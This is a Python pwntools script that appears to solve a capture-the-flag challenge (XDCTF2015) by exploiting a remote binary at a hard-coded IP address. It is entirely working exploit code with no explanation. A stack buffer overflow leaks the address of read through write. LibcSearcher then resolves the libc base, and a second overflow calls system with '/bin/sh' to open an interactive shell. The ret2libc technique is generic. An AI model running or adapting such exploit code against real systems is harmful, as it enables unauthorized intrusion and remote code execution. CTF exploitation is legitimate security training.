from pwn import *
from LibcSearcher import *
import time
context.log_level="debug"
context(arch="amd64",os="linux")

z = remote('111.198.29.45',49363)
z.recvuntil("Welcome to XDCTF2015~!\n")
elf = ELF("./pwn")
write_plt = elf.plt['write']
read_got = elf.got['read']
main_addr = 0x80484be
payload = b'a'*0x6c + p32(0) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4) + b'a'*(0x100-6*4-0x6c)
z.send(payload)
read_addr = u32(z.recv(4))
print(hex(read_addr))
libc = LibcSearcher('read',read_addr)
libc_addr = read_addr - libc.dump('read')
sys_addr = libc_addr + libc.dump('system')
binsh_addr = libc_addr + libc.dump('str_bin_sh')
payload2 = b'a'*0x6c + p32(0) + p32(sys_addr) + p32(0) + p32(binsh_addr) + b'a'*(0x100-4*4-0x6c)
z.send(payload2)
z.interactive()
